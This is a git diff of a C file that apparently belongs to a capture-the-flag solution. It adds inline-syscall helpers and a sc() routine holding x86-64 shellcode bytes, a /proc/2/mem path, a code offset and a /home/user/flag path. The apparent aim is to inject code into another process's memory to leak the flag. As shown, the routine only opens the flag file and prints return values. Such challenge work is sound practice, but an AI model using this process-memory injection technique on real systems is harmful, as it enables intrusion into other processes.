@@ -4,107 +4,68 @@
 #include <syscall.h>
 #include <sys/stat.h>
 #include <sched.h>
-void sc() {
-    uint32_t flag_fd = 0;
-    uint32_t ret = 0;
-    uint32_t err = 0;
+#include <fcntl.h>
+#define __force_inline inline __attribute__((always_inline))
 
-/*
-    char payload[] = {
-            0x48,0x89,0xfe,0x48,
-            0xc7,0xc0,0x28,0x00,
-            0x00,0x00,0x48,0xc7,
-            0xc7,0x01,0x00,0x00,
-            0x00,0x48,0xc7,0xc2,
-            0x00,0x00,0x00,0x00,
-            0x49,0xc7,0xc2,0x12,
-            0x00,0x00,0x00,0x0f,
-            0x05};
-    char not_flag[] = "NOT_FLAG";
-    char mem_str[] = "/home/user/flag";
-*/
+static long __force_inline sc_write(int fd, char *str, size_t len)
+{
+    long ret;
 
-//    void * shellcode;
-//    unt32_t shellcode_len = 40;
-//    asm volatile(
-//        "push $0x00000005\n\t"
-//        "push $0x0f000000\n\t"
-//        "push $0x12c2c749\n\t"
-//        "push $0x00000000\n\t"
-//        "push $0xc2c74800\n\t"
-//        "push $0x000001c7\n\t"
-//        "push $0xc7480000\n\t"
-//        "push $0x0028c0c7\n\t"
-//        "push $0x48fe8948\n\t"
-//        "mov %%rax, %%rsp"
-//        : "=a"(shellcode)
-//        :
-//        : "memory"
-//    );
-
-    void * flag_path;
-    int32_t flag_len = 16;
-    asm volatile(
-        "mov %%rax, $0x0067616c\n\t"
-        "push %%rax\n\t"
-        "push %%rax\n\t"
-        "push %%rax\n\t"
-//        "push $0x662f7265\n\t"
-//        "push $0x73752f65\n\t"
-//        "push $0x6d6f682f\n\t"
-        "mov %%rax, %%rsp"
-        : "=a"(flag_path)
-        :
-        : "memory"
-    );
-
-
-    // write stack to stdout
     asm volatile (
       "syscall"
       : "=a"(ret)
-      : "a"(__NR_write), "D"(1), "S"(flag_path), "d"(flag_len)
+      : "a"(__NR_write), "D"(fd), "d"(len), "S" (str)
       : "rcx", "memory");
-
-//    // open fd for flag file
-//    asm volatile (
-//      "syscall"
-//      : "=a"(flag_fd)
-//      : "a"(__NR_open), "D"(mem_str), "S"(0), "d"(0)
-//      : "rcx", "memory");
-//
-//    // write ret to stdout
-//    asm volatile (
-//      "syscall"
-//      : "=a"(ret)
-//      : "a"(__NR_write), "D"(1), "S"(&flag_fd), "d"(sizeof(flag_fd))
-//      : "rcx", "memory");
-//
-//    asm volatile (
-//      "syscall"
-//      : "=a"(ret)
-//      : "a"(__NR_write), "D"(ret), "S"(not_flag), "d"(sizeof(not_flag))
-//      : "rcx", "memory");
-//
-////    asm volatile (
-////      "syscall"
-////      : "=a"(ret)
-////      : "a"(__NR_lseek), "D"(ret), "S"(0x401b9d), "d"(SEEK_SET)
-////      : "rcx", "memory");
-//
-////    asm volatile (
-////      "syscall"
-////      : "=a"(ret)
-////      : "a"(__NR_write), "D"(ret), "S"(payload), "d"(sizeof(payload))
-////      : "rcx", "memory");
-//
-//
-//    while(1) {
-//        asm volatile (
-//          "syscall"
-//          : "=a"(ret)
-//          : "a"(__NR_sched_yield)
-//          : "rcx", "memory");
-//    }
+    
+    return ret;
 }
 
+static long __force_inline sc_open(char *path, int flags, mode_t mode)
+{
+    long ret;
+
+    asm volatile (
+      "syscall"
+      : "=a"(ret)
+      : "a"(__NR_open), "D"(path), "d"(mode), "S" (flags)
+      : "rcx", "memory");
+    
+    return ret;
+}
+
+static char __force_inline sc_char2hex(char val)
+{
+    if (val < 10)
+        return val + '0';
+    else
+        return val - 10 + 'a';
+}
+
+static long __force_inline sc_write_hex(int fd, unsigned long val)
+{
+    char buf[16];
+    int i;
+
+    for (i = 0; i < 16; i++) {
+        buf[i] = sc_char2hex((val >> (60 - i*4)) & 0xf);
+    }
+
+    return sc_write(fd, buf, 16);
+}
+
+void sc() {
+    char mem_str[] = "/proc/2/mem";
+    char ctf[] = "/home/user/flag";
+    int64_t offset = 0x401b9d;
+    char payload[] = {0x48,0x89,0xfe,0x48,0xc7,0xc0,0x28,0x00,0x00,0x00,0x48,0xc7,0xc7,0x01,0x00,0x00,0x00,0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x49,0xc7,0xc2,0x12,0x00,0x00,0x00,0x0f,0x05};
+    unsigned long ret = 9;
+
+    
+
+    ret = sc_open(ctf, O_RDWR, 0);
+    sc_write_hex(1, ret);
+    ret = sc_write(1, mem_str, sizeof(mem_str));
+    sc_write_hex(1, ret);
+    
+   return;
+}
